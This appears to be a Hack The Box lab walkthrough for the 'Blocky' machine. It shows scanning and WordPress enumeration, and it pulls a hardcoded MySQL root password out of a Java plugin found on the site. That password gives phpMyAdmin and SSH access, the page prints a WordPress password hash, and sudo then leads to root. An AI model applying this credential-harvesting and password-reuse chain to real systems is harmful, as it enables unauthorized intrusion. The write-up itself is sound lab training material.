# HTB - Blocky  10.10.10.37

- Ubuntu 16.04.2 LTS
- Linux 4.4.0-62-generic

- Apache/2.4.18 (Ubuntu)
- WordPress version 4.8
- PhpMyAdmin 4.5.4.1deb2ubuntu2
- mysqlnd 5.0.12-dev - 20150407 
- PHP 7.0.18-0ubuntu0.16.04.1

## Writeup

- https://gist.github.com/berzerk0/1a6270d3cacf30c3b5cff82c7f53bf4c


## Nmap


```
# nmap -sC -sV -A  10.10.10.37
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-09 19:45 CEST
Nmap scan report for 10.10.10.37
Host is up (0.031s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE VERSION

21/tcp   open   ftp     ProFTPD 1.3.5a

22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)

80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!

8192/tcp closed sophos
```

## 21 : ftp     ProFTPD 1.3.5a

```
# searchsploit ProFTPD
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                       | exploits/linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                             | exploits/linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                       | exploits/linux/remote/36742.txt
```

ProFTP 1.3.5 mod_copy allow unauthenticated used to copy files

```
# ftp 10.10.10.37
Connected to 10.10.10.37.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
Name (10.10.10.37:root): anonymous
331 Password required for anonymous
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> site help
214-The following SITE commands are recognized (* =>'s unimplemented)
214-CPFR <sp> pathname
214-CPTO <sp> pathname
214-UTIME <sp> YYYYMMDDhhmm[ss] <sp> path
214-SYMLINK <sp> source <sp> destination
214-RMDIR <sp> path
214-MKDIR <sp> path
214-The following SITE extensions are recognized:
214-RATIO -- show all ratios in effect
214-QUOTA
214-HELP
214-CHGRP
214-CHMOD
214 Direct comments to root@Blocky
ftp> site cpfr /etc/passwd
530 Please login with USER and PASS
ftp> site cpto /tmp/passwd.copy
503-Bad sequence of commands
503 Bad sequence of commands
ftp> 
```
Not working


## 80 : Minecraft like blog

### Cewl

```
# cewl http://10.10.10.37 -m 2 -w cewl.lst
CeWL 5.4.3 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
root@kali:~/htb/YoloToolbox/machines/htb/blocky# cat cewl.lst 
BlockyCraft
to
site
content
Welcome
and
for
Comments
July
the
WordPress
wrap
entry
by
are
Feed
header
server
stuff
of
branding
Search
Recent
RSS
Really
Simple
Syndication
Under
Construction
if
IE
Posts
Log
org
page
Powered
everyone
The
still
under
construction
so
don
expect
too
much
right
now
We
currently
developing
wiki
system
core
plugin
track
player
stats
Lots
great
planned
future
in
http
lt
Skip
text
custom
masthead
Posted
onpersonal
publishing
platform
Notch         <====== Try with Notch and notch => Process this file with and without 
email
Email
address
will
respond
or
index
php
welcome
blockycraft
Leave
...
link
create
new
via
```
Useless...



### WPScan
```
Identify usernames
& some vulnerabilitie snot tested

# wpscan --url 10.10.10.37 -e
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.3.1
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://10.10.10.37/
[+] Started: Wed Sep 11 14:02:09 2019

Interesting Finding(s):

[+] http://10.10.10.37/
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.10.10.37/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.10.37/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.8 identified.
 | Detected By: Rss Generator (Passive Detection)
 |  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |
 | [!] 28 vulnerabilities identified:
 |
 | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
 |     Fixed in: 4.8.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8905
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14723
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
 |      - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
 |
 | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
 |     Fixed in: 4.8.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8910
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41398
 |
 | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
 |     Fixed in: 4.8.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8911
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41457

 |

 |
...
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.8.10
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9867
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
 | Last Updated: 2019-05-07T00:00:00.000Z
 | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins

[i] No plugins Found.

[+] Enumerating Vulnerable Themes
 Checking Known Locations - Time: 00:00:02 <============================================================================> (311 / 311) 100.00% Time: 00:00:02
[+] Checking Theme Versions

[i] No themes Found.

[+] Enumerating Timthumbs
 Checking Known Locations - Time: 00:00:19 <==========================================================================> (2573 / 2573) 100.00% Time: 00:00:19

[i] No Timthumbs Found.

[+] Enumerating Config Backups
 Checking Config Backups - Time: 00:00:00 <===============================================================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports
 Checking DB Exports - Time: 00:00:00 <===================================================================================> (36 / 36) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias
 Brute Forcing Attachment IDs - Time: 00:00:03 <========================================================================> (100 / 100) 100.00% Time: 00:00:03

[i] No Medias Found.

[+] Enumerating Users
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] notch
 | Detected By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Detected By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Finished: Wed Sep 11 14:02:55 2019
[+] Requests Done: 3091
[+] Memory used: 127.629 MB
[+] Elapsed time: 00:00:46


```
=> notch


### gobuster

```
# /opt/gobuster/gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.37  -l -x html,php,js,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.37
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php,js,txt
[+] Timeout:        10s
===============================================================
2019/09/11 13:28:25 Starting gobuster
===============================================================
/index.php (Status: 301) [Size: 0]
/wiki (Status: 301) [Size: 309]
/wp-content (Status: 301) [Size: 315]
/wp-login.php (Status: 200) [Size: 2402]
/plugins (Status: 301) [Size: 312]            <=======
/license.txt (Status: 200) [Size: 19935]
/wp-includes (Status: 301) [Size: 316]
/javascript (Status: 301) [Size: 315]
/readme.html (Status: 200) [Size: 7413]
/wp-trackback.php (Status: 200) [Size: 135]
/wp-admin (Status: 301) [Size: 313]
/phpmyadmin (Status: 301) [Size: 315]         <=====
```


## http://10.10.10.37//wp-content/uploads/2017/07/mcwallpaper.jpg

Some wallpapers


## 80: http://10.10.10.37/plugins/


- BlockyCore.jar  => unzip it
- griefprevention-1.11.2-3.1.1.298.jar


### BlockyCore.jar

unzip BlockyCore.jar, then string on .class

```
root@kali:~/htb/YoloToolbox/machines/htb/blocky/loot/BlockCore_src/com/myfirstplugin# strings BlockyCore.class 
com/myfirstplugin/BlockyCore
java/lang/Object
sqlHost
Ljava/lang/String;
sqlUser
sqlPass
<init>
Code
	localhost	
root	
8YsqfCTnvxAUeduzjNSXe22	
LineNumberTable
LocalVariableTable
this
Lcom/myfirstplugin/BlockyCore;
onServerStart
onServerStop
onPlayerJoin
TODO get username
!Welcome to the BlockyCraft!!!!!!!
sendMessage
'(Ljava/lang/String;Ljava/lang/String;)V
username
message
SourceFile
BlockyCore.java
```

=>  root	
=> 8YsqfCTnvxAUeduzjNSXe22	


## phpmyadmin



Log with credentials


Get user : Notch    $P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/

=> notch

## ssh


ssh notch with the same password

```
# ssh notch@10.10.10.37
The authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.
ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.37' (ECDSA) to the list of known hosts.
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Sun Dec 24 09:34:35 2017
notch@Blocky:~$ 
notch@Blocky:~$ 
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt 
XXXXXXXXXXX
```

## System


```
$ cat /etc/issue
Ubuntu 16.04.2 LTS \n \l

notch@Blocky:~$ uname -a
Linux Blocky 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```


## sudo

```
$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL


notch@Blocky:~$ ls /root
ls: cannot open directory '/root': Permission denied
notch@Blocky:~$ sudo ls /root
root.txt
notch@Blocky:~$ sudo cat /root/root/txt
cat: /root/root/txt: No such file or directory
notch@Blocky:~$ sudo cat /root/root.txt
XXXXXXXXXXX
```
